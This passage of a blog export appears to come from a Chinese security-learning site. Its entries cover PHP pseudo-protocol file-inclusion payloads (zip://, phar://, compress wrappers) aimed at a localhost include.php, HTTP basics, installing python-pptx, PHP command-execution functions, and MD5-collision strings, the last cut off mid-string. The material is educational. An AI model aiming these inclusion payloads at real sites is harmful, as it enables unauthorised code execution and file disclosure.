+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/2601089036-5cc1c48368e3c.jpg" class="" title="preview">
+
+<p>(不是我的电脑跑出来的)</p>
+<p>2.compress.bzip2://file.bz2</p>
+<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure>
+
+<p>3.compress.zlib://file.gz</p>
+<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671706583-5cc1c49669d55.jpg" class="" title="preview">
+
+<p>(不是我的电脑跑出来的)</p>
+<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h3><p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/1498791729-5cc1c53485c22_fix732.jpg" class="" title="图片描述">
+
+<p>(不是我的电脑跑出来的)</p>
+<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：phar://协议对象注入技术。</p>
+<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
+<p>参考文章：<a href="https://link.segmentfault.com/?enc=uu8GYhazLhEL7GrQ1gKSwQ==.D/ShJaCqBcXzzderXpLTs/CSwUddfeYJPT1whQOEjyg=">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p>
+<p>本文大多数是参考这篇文章得来的，部分图解也来自上面:<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>HTTP相关知识</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/HTTP/</url>
+    <content><![CDATA[<p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了六种请求方法：OPTIONS, PUT, PATCH, DELETE, TRACE 和 CONNECT 方法。</p>
+<span id="more"></span>
+
+<h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了六种请求方法：OPTIONS, PUT, PATCH, DELETE, TRACE 和 CONNECT 方法。</p>
+<table>
+<thead>
+<tr>
+<th>No.</th>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>GET</td>
+<td>请求指定的页面信息，并返回实体主体。</td>
+</tr>
+<tr>
+<td>2</td>
+<td>HEAD</td>
+<td>类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头</td>
+</tr>
+<tr>
+<td>3</td>
+<td>POST</td>
+<td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</td>
+</tr>
+<tr>
+<td>4</td>
+<td>PUT</td>
+<td>从客户端向服务器传送的数据取代指定的文档的内容。</td>
+</tr>
+<tr>
+<td>5</td>
+<td>PATCH</td>
+<td>用于对资源进行部分修改。</td>
+</tr>
+<tr>
+<td>6</td>
+<td>DELETE</td>
+<td>请求服务器删除指定的页面。</td>
+</tr>
+<tr>
+<td>7</td>
+<td>CONNECT</td>
+<td>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</td>
+</tr>
+<tr>
+<td>8</td>
+<td>OPTIONS</td>
+<td>允许客户端查看服务器的性能。</td>
+</tr>
+<tr>
+<td>9</td>
+<td>TRACE</td>
+<td>回显服务器收到的请求，主要用于测试或诊断。</td>
+</tr>
+</tbody></table>
+<h2 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h2><p>HTTP状态码（Status-Code）由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：</p>
+<pre><code>1xx 信息响应类，表示接收到请求并且继续处理
+2xx 处理成功响应类，表示动作被成功接收、理解和接受
+3xx 重定向响应类，为了完成指定的动作，必须接受进一步处理
+4xx 客户端错误，客户请求包含语法错误或者是不能正确执行
+5xx 服务端错误，服务器不能正确执行一个正确的请求
+</code></pre>
+<p>常见状态代码、状态描述、说明：</p>
+<pre><code>200 OK //客户端请求成功
+400 Bad Request //客户端请求有语法错误，不能被服务器所理解
+401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用
+403 Forbidden //服务器收到请求，但是拒绝提供服务
+404 Not Found //请求资源不存在，eg：输入了错误的URL
+500 Internal Server Error //服务器发生不可预期的错误
+503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 
+</code></pre>
+<p>转载至：<a href="https://blog.csdn.net/woaixiaoyu520/article/details/76690686">https://blog.csdn.net/woaixiaoyu520/article/details/76690686</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>HTTP请求中，几种常见的Content-Type类型</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/HTTP%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%A7%8DContent-Type%E7%B1%BB%E5%9E%8B/</url>
+    <content><![CDATA[<p>POST请求的消息主体放在entity body中，服务端根据请求头中的Content-Type字段来获取消息主体的编码方式，进而进行解析数据。</p>
+<span id="more"></span>
+
+<h2 id="HTTP请求中，几种常见的Content-Type类型"><a href="#HTTP请求中，几种常见的Content-Type类型" class="headerlink" title="HTTP请求中，几种常见的Content-Type类型"></a>HTTP请求中，几种常见的Content-Type类型</h2><p>POST请求的消息主体放在entity body中，服务端根据请求头中的Content-Type字段来获取消息主体的编码方式，进而进行解析数据。</p>
+<h3 id="1-application-x-www-form-urlencoded"><a href="#1-application-x-www-form-urlencoded" class="headerlink" title="1.application/x-www-form-urlencoded"></a>1.application/x-www-form-urlencoded</h3><p>最常见的 POST 提交数据的方式，原生Form表单，如果不设置 enctype 属性，默认为application/x-www-form-urlencoded 方式提交数据。</p>
+<p>首先，Content-Type被指定为  application/x-www-form-urlencoded；其次，提交的表单数据会转换为键值对并按照  key1=val1&amp;key2=val2 的方式进行编码，key 和 val 都进行了 URL  转码。大部分服务端语言都对这种方式有很好的支持。<br>另外，如利用AJAX 提交数据时，也可使用这种方式。例如 jQuery，Content-Type 默认值都是”application/x-www-form-urlencoded;charset=utf-8”。</p>
+<h3 id="2-multipart-form-data"><a href="#2-multipart-form-data" class="headerlink" title="2.multipart/form-data"></a>2.multipart/form-data</h3><p>另一个常见的 POST 数据提交的方式， Form 表单的 enctype  设置为multipart/form-data，它会将表单的数据处理为一条消息，以标签为单元，用分隔符（这就是boundary的作用）分开，类似我们上面Content-Type中的例子。<br>　由于这种方式将数据有很多部分，它既可以上传键值对，也可以上传文件，甚至多个文件。当上传的字段是文件时，会有Content-Type来说明文件类型；Content-disposition，用来说明字段的一些信息。每部分都是以 –boundary  开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（字段、文本或二进制等）。如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 –boundary– 标示结束。</p>
+<h3 id="3-application-json"><a href="#3-application-json" class="headerlink" title="3.application/json"></a>3.application/json</h3><p>Content-Type: application/json  作为响应头比较常见。实际上，现在越来越多的人把它作为请求头，用来告诉服务端消息主体是序列化后的 JSON 字符串，其中一个好处就是JSON  格式支持比键值对复杂得多的结构化数据。由于 JSON 规范的流行，除了低版本 IE  之外的各大浏览器都原生支持JSON.stringify，服务端语言也都有处理 JSON 的函数，使用起来没有困难。<br>Google 的 AngularJS 中的 Ajax 功能，默认就是提交 JSON 字符串。</p>
+<h3 id="4-text-xml"><a href="#4-text-xml" class="headerlink" title="4.text/xml"></a>4.text/xml</h3><p>XML的作用不言而喻，用于传输和存储数据，它非常适合万维网传输，提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据，在JSON出现之前是业界一大标准（当然现在也是），相比JSON的优缺点大家有兴趣可以上网search。因此，在POST提交数据时，xml类型也是不可缺少的一种，虽然一般场景上使用JSON可能更轻巧、灵活。</p>
+<h3 id="5-binary-application-octet-stream"><a href="#5-binary-application-octet-stream" class="headerlink" title="5.binary (application/octet-stream)"></a>5.binary (application/octet-stream)</h3><p>在Chrome浏览器的Postman工具中，还可以看到”binary“这一类型，指的就是一些二进制文件类型。如application/pdf，指定了特定二进制文件的MIME类型。就像对于text文件类型若没有特定的子类型（subtype），就使用 text/plain。类似的，二进制文件没有特定或已知的 subtype，即使用  application/octet-stream，这是应用程序文件的默认值，一般很少直接使用 。</p>
+<p>对于application/octet-stream，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件，后台接收参数只能有一个，而且只能是流（或者字节数组）。</p>
+<p>很多web服务器使用默认的 application/octet-stream 来发送未知类型。出于一些安全原因，对于这些资源浏览器不允许设置一些自定义默认操作，导致用户必须存储到本地以使用。一般来说，设置正确的MIME类型很重要。</p>
+<p>转载至:<a href="https://blog.csdn.net/woaixiaoyu520/article/details/76690686">https://blog.csdn.net/woaixiaoyu520/article/details/76690686</a> </p>
+]]></content>
+  </entry>
+  <entry>
+    <title>python关于pptx的安装</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/python%E5%85%B3%E4%BA%8Epptx%E7%9A%84%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>首先安装whell</p>
+<p>进入下面这个网址:</p>
+<p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p>
+<span id="more"></span>
+
+<h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>首先安装whell</p>
+<p>进入下面这个网址:</p>
+<p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p>
+<p>下载与自己电脑版本对应的.whl文件(不要该文件名!)</p>
+<p>输入python –version查看python版本,输入systeminfo查看电脑位数:</p>
+<p><img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20210929211919544.png" alt="image-20210929211919544"></p>
+<p>本机python版本为3.9，64位的。</p>
+<p>下载与之对应的版本(保存在哪里都一样):</p>
+<img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20210929212040591.png" alt="image-20210929212040591" style="zoom:67%;" />
+
+<p>进入保存.whl所在的文件夹，执行pip install lxml-4.6.3-cp39-cp39-win_amd64.whl  此处的文件为你所下载的文件名。</p>
+<p>安装成功后，用pip install python-pptx 安装就行了。</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p>在Pycharm上安装pptx，打开设置</p>
+<p><img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20211012154552061.png" alt="image-20211012154552061"></p>
+<p>然后进入Projiect里面的interpreter点击加号</p>
+<p><img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20211012154739530.png" alt="image-20211012154739530"></p>
+<p>会出现下面界面，安装图中的包就行了(右下角有install package)</p>
+<img src="C:\Users\86189\AppData\Roaming\Typora\typora-user-images\image-20211012154854942.png" alt="image-20211012154854942" style="zoom:50%;" />
+
+<p>其实这种方式最终也会用到pip，只是这种是图形化的</p>
+<p>参考连接:<a href="https://www.jianshu.com/p/ecc187c2a46a">https://www.jianshu.com/p/ecc187c2a46a</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>PHP的命令执行函数</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="PHP的命令执行函数"><a href="#PHP的命令执行函数" class="headerlink" title="PHP的命令执行函数"></a>PHP的命令执行函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h1 id="PHP的命令执行函数-1"><a href="#PHP的命令执行函数-1" class="headerlink" title="PHP的命令执行函数"></a>PHP的命令执行函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+
+<p>1.system() 执行外部程序，并且显示输出，返回最后一行shell结果，如果后面还有参数则将返回值保存在该变量中。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$lase_line</span>=system(<span class="string">&#x27;ls&#x27;</span>, <span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">// 将输出的最后一样内容返回到 $last_line。</span></span><br><span class="line"><span class="comment">// 将命令的返回内容保存到 $retval。</span></span><br><span class="line"><span class="comment">//前面是string，后面$retval是int类型。</span></span><br></pre></td></tr></table></figure>
+
+<p>2.passthru() 执行外部程序并且显示原始输出。当所执行的 Unix 命令输出二进制数据，    并且需要直接传送到浏览器的时候，    需要用此函数来替代 exec() 或 system()函数。通过设置 Content-type 为 image/gif，然后调用 pbmplus 程序输出 gif 文件，    就可以从 PHP 脚本中直接输出图像到浏览器，    就可以从 PHP 脚本中直接输出图像到浏览器。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">passthru(<span class="string">&#x27;ls&#x27;</span>,<span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">//没有返回值。</span></span><br><span class="line"><span class="comment">//如果有$retval参数(int类型)，返回内容保存到$retval中。</span></span><br></pre></td></tr></table></figure>
+
+<p>3.exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(<span class="string">&#x27;ls&#x27;</span>,<span class="variable">$output</span>,<span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">//$output为array类型</span></span><br><span class="line"><span class="comment">//$retval为int类型</span></span><br></pre></td></tr></table></figure>
+
+<p>如果提供了$output 参数，那么会用命令执行的输出填充此数组，每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n字符。请注意，如果数组中已经包含了部分元素，exec()函数会在数组末尾追加内容。</p>
+<p>4.popen() 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$handle</span> = popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">//前面为命令，后面为模式，模式分为只读和只写。</span></span><br><span class="line"><span class="comment">//只写(打开并清空已有文件或者创建一个新文件夹)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>出错返回false，在php3后续版本支持可读可写，但需要使用pclose()关闭。(除非这个句柄是以一种模式打开的)</p>
+<p>5.shell_exec()通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell_exec(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
+
+<p>发生错误或者进程不产生输出，则返回 null。</p>
+<p>6.proc_open() 执行一个命令，并且打开用来输入/输出的文件指针。类似popen()函数，但是proc_open()提供了更强大的控制程序执行的能力。(不常用)</p>
+<p>7.pcntl_exec() 在当前进程空间执行指定程序。(不常用)</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>特殊的md5值</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/%E7%89%B9%E6%AE%8A%E7%9A%84md5%E5%80%BC/</url>
+    <content><![CDATA[<h3 id="三个相同MD5值的字符串-字符串不同，细微区别"><a href="#三个相同MD5值的字符串-字符串不同，细微区别" class="headerlink" title="三个相同MD5值的字符串(字符串不同，细微区别):"></a>三个相同<code>MD5</code>值的字符串(字符串不同，细微区别):</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s1</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s2</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s3</span>)));</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="三个相同MD5值的字符串-字符串不同，细微区别-1"><a href="#三个相同MD5值的字符串-字符串不同，细微区别-1" class="headerlink" title="三个相同MD5值的字符串(字符串不同，细微区别):"></a>三个相同<code>MD5</code>值的字符串(字符串不同，细微区别):</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2